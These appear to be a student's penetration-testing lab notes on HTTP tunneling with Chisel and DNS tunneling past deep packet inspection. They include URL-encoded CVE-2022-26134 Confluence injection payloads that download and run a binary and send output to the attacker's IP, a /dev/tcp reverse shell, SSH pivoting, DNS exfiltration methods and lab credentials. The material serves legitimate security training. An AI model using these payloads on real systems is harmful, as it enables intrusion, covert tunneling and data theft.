
Deep Packet Inspection (DPI) *aka* packet sniffing
- Method of examining the content of data packets as they pass by a checkpoint on the network


# HTTP Tunneling
##### Scenario:
- Have compromised CONFLUENCE01, and can execute commands via HTTP requests.
- Blocked by a considerably restrictive network configuration when trying to pivot.
- DPI is terminating all outbound traffic except HTTP
- All inbound ports on CONFLUENCE01 are blocked except TCP/8090


- Can't rely on a normal reverse shell as it would not conform to the HTTP format and would be terminated at the network perimeter by the DPI solution.
- Can't create an SSH remote port forward for the same reason.
- Only traffic that will reach our Kali machine is HTTP
	- Can, for example, make requests with _Wget_ and _cURL_.

- FIREWALL/INSPECTOR device has replaced the previous simple firewall.
- MULTISERVER03 is blocked on the WAN interface.
- Have credentials for the PGDATABASE01 server
- Need to figure out how to SSH directly there through CONFLUENCE01.
- Need a tunnel into the internal network
- Must resemble an outgoing HTTP connection from CONFLUENCE01.
- CONFLUENCE01 is Linux based (allowing us to use **chisel**)

##### Execution:
![](http-tunnel.png)
- Run [Chisel](Tools.md#chisel) server on Kali
- Accept a connection from a Chisel client running on CONFLUENCE01
- Chisel will bind a SOCKS proxy port on the Kali machine.
	- With `--reverse` options set
- The Chisel server will encapsulate whatever we send through the SOCKS port and push it through the HTTP tunnel, SSH-encrypted.
- The Chisel client will then decapsulate it and push it wherever it is addressed.

> The traffic between the Chisel client and server is all HTTP-formatted. This means we can traverse the deep packet inspection solution regardless of the contents of each HTTP packet. The Chisel server on our Kali machine will listen on TCP port 1080, a SOCKS proxy port. All traffic sent to that port will be passed back up the HTTP tunnel to the Chisel client, where it will be forwarded wherever it's addressed.

- CONFLUENCE01 - **192.168.239.63**
- PGDATABASE01 - **10.4.239.215**   `database_admin / sqlpass123`


- Copy chisel over to CONFLUENCE01
```bash
sudo cp $(which chisel) .

python3 -m http.server 80
```

- Craft CONFLUENCE01 injectable payload to download chisel and set as an executable
```bash
wget 192.168.45.166/chisel -O /tmp/chisel && chmod +x /tmp/chisel
```

- Submit payload via a a URL encoded **curl** injection
```bash
curl http://192.168.239.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.45.166/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/
```

- Set up Reverse Port Forward Server on Kali
```bash
chisel server --port 8080 --reverse
	2024/06/24 21:16:49 server: Reverse tunnelling enabled
	2024/06/24 21:16:49 server: Fingerprint eqnhO59Dz8gJ4de6b2Kvvnbv1X/QhAPgs8v4PsyBhck=
	2024/06/24 21:16:49 server: Listening on http://0.0.0.0:8080
```

- Log incoming traffic
```bash
sudo tcpdump -nvvvXi tun0 tcp port 8080
	[sudo] password for kali:
	tcpdump: listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```

- Craft an injectable payload which also redirects stdout and stderr to a file, sending it back to our Kali for debugging needs
```bash
/tmp/chisel client 192.168.45.166:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://192.168.45.166:8080/
```

- Start the Chisel client, applying the server address and the port forwarding configuration options via a URL encoded **curl** injection
```bash
curl http://192.168.239.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.45.166:8080%20R:socks%20%26%3E%20/tmp/output%20%3B%20curl%20--data%20@/tmp/output%20http://192.168.45.166:8080/%27%29.start%28%29%22%29%7D/
```

- View data in **tcpdump** for any error messages
```bash
	...
	/tmp/chisel: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.32` not found (required by /tmp/chisel)/tmp/chisel: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34` not found (required by /tmp/chisel)
	...
```
	- Points towards a version incompatibility.
	- Chisel is expecting to use glibc version 2.32 or 2.34, neither of which can be found on CONFLUENCE01.

> When a version of a tool or component is more recent than the operating system it's trying to run on, there's a risk that the operating system will not contain the required technologies that the newer tool is expecting to be able to use

- Check **chisel** version
```bash
chisel -h

  Usage: chisel [command] [--help]

  Version: 1.9.1-0kali1 (go1.21.3)
```
	- Chisel version 1.9.1
	- Written in Go version 1.21.3

> Googling reveals that similar messages appear when binaries compiled with Go versions 1.20 and later are run on operating systems that don't have a compatible version of **glibc**.

As the version which introduces this error is 1.20, we'll need to look for versions of **chisel** that are written with a previous version of Go.
Looking through the official github's releases, there's a 1.8.1 version that uses Go 1.9

- Replace with compatible version
```bash
# Download v1.8.1 (working in ~/exercises/forward_tunnel dir)
wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz
	...
	chisel_1.8.1_linux_amd64.gz            100%[============================================================================>]   3.33M  --.-KB/s    in 0.1s
	...

# Remove newer chisel
rm chisel

# Unzip v1.8.1
gunzip chisel_1.8.1_linux_amd64.gz

# Rename
mv chisel_1.8.1_linux_amd64 chisel

# Make executable
chmod +x chisel

# Server
python3 -m http.server 80
```

- Resubmit v1.8.1 chisel to CONFLUENCE01, store in /tmp/, and make executable
```bash
curl http://192.168.239.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.45.166/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/
```

- Resubmit injectable payload, redirecting stdout and stderr to a file for debugging, starting the client, and applying the server address and the port forwarding configuration options via a URL encoded **curl** injection
```bash
curl http://192.168.239.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.45.166:8080%20R:socks%20%26%3E%20/tmp/output%20%3B%20curl%20--data%20@/tmp/output%20http://192.168.45.166:8080/%27%29.start%28%29%22%29%7D/
```

If all goes well, you should see the connection back in tcpdump, the terminal w/ the chisel server running, and ss output
```bash
# Tcpdump Output
	...
	GET / HTTP/1.1
        Host: 192.168.45.166:8080
        User-Agent: Go-http-client/1.1
        Connection: Upgrade
        Sec-WebSocket-Key: 1XYYBchie98k37jAyB+/PQ==
        Sec-WebSocket-Protocol: chisel-v3
        Sec-WebSocket-Version: 13
        Upgrade: websocket
		...


# Terminal w/ chisel server
	2024/06/24 21:16:49 server: Listening on http://0.0.0.0:8080
	2024/06/24 21:52:47 server: session#1: Client version (1.8.1) differs from server version (1.9.1-0kali1)
	2024/06/24 21:52:47 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening


# ss Output
ss -ntlpu
	Netid       State        Recv-Q       Send-Q              Local Address:Port                Peer Address:Port       Process
	udp         UNCONN       0            0                     0.0.0.0:49038                    0.0.0.0:*
	tcp         LISTEN       0            4096                127.0.0.1:1080                     0.0.0.0:*           users:(("chisel",pid=8598,fd=8))
	tcp         LISTEN       0            4096                        *:8080                           *:*           users:(("chisel",pid=8598,fd=6))
```
	- SOCKS proxy port 1080 is listening on the loopback interface of our Kali machine

###### proxychains

- Edit conf file
```bash
sudo vim /etc/proxychains4.conf
	socks5 127.0.0.1 1080
```

- SSH in to PGDATABASE01
```bash
proxychains ssh database_admin@10.4.239.215
	[proxychains] config file found: /etc/proxychains4.conf
	[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
	[proxychains] DLL init: proxychains-ng 4.17
	[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.4.239.215:22  ...  OK
	...
	Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
	Warning: Permanently added '10.4.239.215' (ED25519) to the list of known hosts.
	database_admin@10.4.239.215''s password: 
	Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-125-generic x86_64)
	...
	Last login: Thu Feb 16 21:49:42 2023 from 10.4.50.63
	database_admin@pgdatabase01:~$


cat /tmp/chisel_flag 
	OS{ceff330a45bf0b99e00bdc5fe6c28aa2}
```



# DNS Tunneling

Can serve as a mechanism to tunnel data _indirectly_ in and out of restrictive network environments

 See [DNS](dns.md) for overview of service.
 
##### Scenario:

- FELINEAUTHORITY is situated on WAN along Kali
	- MULTISERVER03, CONFLUENCE01, & Kali can route to it
	- PGDATABASE01 & HRSHARES can't
- FELINEAUTHORITY is registgered w/in the network as the authoritative name server for the **feline.corp** zone
- PGDATABASE01 can't connect directly to FELINEAUTHORITY
	- Can connect to MULTISERVER03
- MULTISERVER03 is configured as the DNS resolver server for PGDATABASE01

##### Execution:

###### Foothold Setup
- Gain shell on FELINEAUTHORITY and PGDATABASE01
	- Can SSH directly into FELINEAUTHORITY as *kali* user
	- Pivot from CONFLUENCE01 to PGDATABASE01 via ssh remote port forward
		- SSH into PGDATABASE01 as *database_admin* user
- View how DNS requests are relayed to FELINEAUTHORITY from PGDATABASE01

- FELINEAUTHORITY - **192.168.189.7** - kali : 7he_C4t_c0ntro11er
- CONFLUENCE01 - **192.168.189.63**
- MULTISERVER03 - **192.168.189.64**
- PGDATABASE01 - **10.4.189.215** - database_admin : sqlpass123


- Enable the SSH server on Kali & verify SSH port is open
```bash
sudo systemctl start ssh

udo ss -ntplu
	Netid       State        Recv-Q       Send-Q             Local Address:Port                Peer Address:Port       Process  
	...
	tcp         LISTEN       0            128                      0.0.0.0:22                       0.0.0.0:*           users:(("sshd",pid=2153,fd=3))
	tcp         LISTEN       0            128                         [::]:22                          [::]:*           users:(("sshd",pid=2153,fd=4))
```
	- SSH server is listening on port 22 for all interfaces for IPv4 & IPv6


- Compromise CONFLUENCE01 w/ CVE-2022-26134 & construct remote port forward.
```bash
curl -v http://192.168.189.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.166/5555%200%3E%261%27%29.start%28%29%22%29%7D/

# In revshell
python3 -c 'import pty; pty.spawn("/bin/sh")'

# Set up a dynamic reverse port forward
ssh -N -R 2345 192.168.45.166
```

- In Kali, ssh into PGDATABASE01 and FELINEAUTHORITY
```bash
# Tab 1 (PGDATABASE01)
proxychains ssh database_admin@10.4.189.215
	[proxychains] config file found: /etc/proxychains4.conf
	[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
	[proxychains] DLL init: proxychains-ng 4.17
	[proxychains] Strict chain  ...  127.0.0.1:2345  ...  10.4.189.215:22  ...  OK
	The authenticity of host '10.4.189.215 (10.4.189.215)' can''t be established.
	ED25519 key fingerprint is SHA256:oPdvAJ7Txfp9xOUIqtVL/5lFO+4RY5XiHvVrZuisbfg.
	...
	Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
	Warning: Permanently added '10.4.189.215' (ED25519) to the list of known hosts.
	database_admin@10.4.189.215''s password:
	...
	database_admin@pgdatabase01:~$


# Tab 2 (FELINEAUTHORITY)
ssh kali@192.168.189.7
	kali@192.168.189.7''s password: 
	Linux felineauthority 6.1.0-kali5-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.12-1kali2 (2023-02-23) x86_64
	...
	kali@felineauthority:~$
```

- Simulate a DNS setup on FELINEAUTHORITY
```bash
cd dns_tunneling

cat dnsmasq.conf
	# Do not read /etc/resolv.conf or /etc/hosts
	no-resolv
	no-hosts
	
	# Define the zone
	auth-zone=feline.corp
	auth-server=feline.corp
```
	- Configuration ignores */etc/resolv.conf* and */etc/hosts*
	- Only defines the *auth-zone* and *auth-server* variables
		- Tells dnsmasq to act as the authoritative name server for **feline.corp** zone
	- Records have not b een configured.

- Start **dnsmasq** using 'no daemon' mode for foreground processing
```bash
sudo dnsmasq -C dnsmasq.conf -d
	[sudo] password for kali: 
	dnsmasq: started, version 2.89 cachesize 150
	dnsmasq: compile time options: IPv6 GNU-getopt DBus no-UBus i18n IDN2 DHCP DHCPv6 no-Lua TFTP conntrack ipset nftset auth cryptohash DNSSEC loop-detect inotify dumpfile
	dnsmasq: warning: no upstream servers configured
	dnsmasq: cleared cache
```

- In a new FELINEAUTHORITY shell, capture DNS packets (UDP/53)
```bash
sudo tcpdump -i ens192 udp port 53
	[sudo] password for kali: 
	tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
	listening on ens192, link-type EN10MB (Ethernet), snapshot length 262144 bytes
```

- With both **dnsmasq** and **tcpdump** running in tow FELINEAUTHORITY shells, make a DNS query aimed at **feline.corp** domain from PGDATABASE01
```bash
# database_admin@pgdatabase01:~$
resolvectl status
	Global
	       LLMNR setting: no                  
	MulticastDNS setting: no                  
	  DNSOverTLS setting: no                  
	      DNSSEC setting: no                  
	    DNSSEC supported: no                  
	          DNSSEC NTA: 10.in-addr.arpa
	...
	Link 5 (ens224)
	      Current Scopes: DNS        
	DefaultRoute setting: yes        
	       LLMNR setting: yes        
	MulticastDNS setting: no         
	  DNSOverTLS setting: no         
	      DNSSEC setting: no         
	    DNSSEC supported: no         
	  Current DNS Server: 10.4.189.64
	         DNS Servers: 10.4.189.64
	
	Link 4 (ens192)
	      Current Scopes: DNS        
	DefaultRoute setting: yes        
	       LLMNR setting: yes        
	MulticastDNS setting: no         
	  DNSOverTLS setting: no         
	      DNSSEC setting: no         
	    DNSSEC supported: no         
	  Current DNS Server: 10.4.189.64
	         DNS Servers: 10.4.189.64
```
	- PGDATABASE01's DNS server is set to 10.4.189.64 (MULTISERVER03)
	- As PGDATABASE01 has no outgoing network connectivity, it can't communicate directly with FELINEAUTHORITY

- Use **nslookup** to make a DNS request for **exfiltrated-data.feline.com**
```bash
# database_admin@pgdatabase01:~$
nslookup exfiltrated-data.feline.corp
	Server:         127.0.0.53
	Address:        127.0.0.53#53
	
	** server can''t find exfiltrated-data.feline.corp: NXDOMAIN
```
	- NXDOMAIN is expected as we haven't configured the DNS server to actually serve records

- View of DNS request from MULTISERVER03 to FELINEAUTHORITY
```bash
	16:10:49.580228 IP 192.168.189.64.58905 > 192.168.189.7.domain: 55536+ [1au] A? exfiltrated-data.feline.corp. (57)
	16:10:49.580313 IP 192.168.189.7.domain > 192.168.189.64.58905: 55536 NXDomain 0/0/1 (57)
[[19 - HTTP & DNS Tunneling]]```
	- FELINEAUTHORITY has received an A record requst for **exfiltrated-data.feline.corp.** because MULTISERVER03 determined the
		  authoritative name server for the **feline.corp** zone.
		  All requests for any subdomain of **feline.corp** will be forwarded to FELINEAUTHORITY


>An arbitrary DNS query from an internal host (with no other outbound connectivity) has found its way to an external server we control.
>This may seem subtle, but it illustrates that we can transfer small amounts of information (exfiltrated data) from inside the network to the outside, without a direct connection, just by making DNS queries.


##### Exfiltrating data and binaries

>This would require a series of sequential requests. We could convert a binary file into a long _hex_ string representation, split this string into a series of smaller chunks, then send each chunk in a DNS request for **\[hex-string-chunk].feline.corp**. On the server side, we could log all the DNS requests and convert them from a series of hex strings back to a full binary.


##### Infiltrating data and binaries

- Kill the previous **dnsmasque** process. check contents of **dnsmasq_txt.conf**, & run again w/ the new configuration
```bash
# kali@felineauthority:~/dns_tunneling$

cat dnsmasq_txt.conf 
	# Do not read /etc/resolv.conf or /etc/hosts
	no-resolv
	no-hosts
	
	# Define the zone
	auth-zone=feline.corp
	auth-server=feline.corp
	
	# TXT record
	txt-record=www.feline.corp,here''s something useful!
	txt-record=www.feline.corp,here''s something else less useful.

sudo dnsmasq -C dnsmasq_txt.conf -d
	dnsmasq: started, version 2.89 cachesize 150
	dnsmasq: compile time options: IPv6 GNU-getopt DBus no-UBus i18n IDN2 DHCP DHCPv6 no-Lua TFTP conntrack ipset nftset auth cryptohash DNSSEC loop-detect inotify dumpfile
	dnsmasq: warning: no upstream servers configured
	dnsmasq: cleared cache
```
	- Now, any request for TXT records, should deliver these two string values.


- Test by running nslookup on PGDATABASE01
```bash
# database_admin@pgdatabase01:~$

nslookup -type=txt www.feline.corp
	Server:         127.0.0.53
	Address:        127.0.0.53#53
	
	Non-authoritative answer:
	www.feline.corp text = "here's something else less useful."
	www.feline.corp text = "here's something useful!"
	
	Authoritative answers can be found from:
```


> If we wanted to infiltrate binary data, we could serve it as a series of Base64 or ASCII hex encoded TXT records and convert them back into binary on the internal server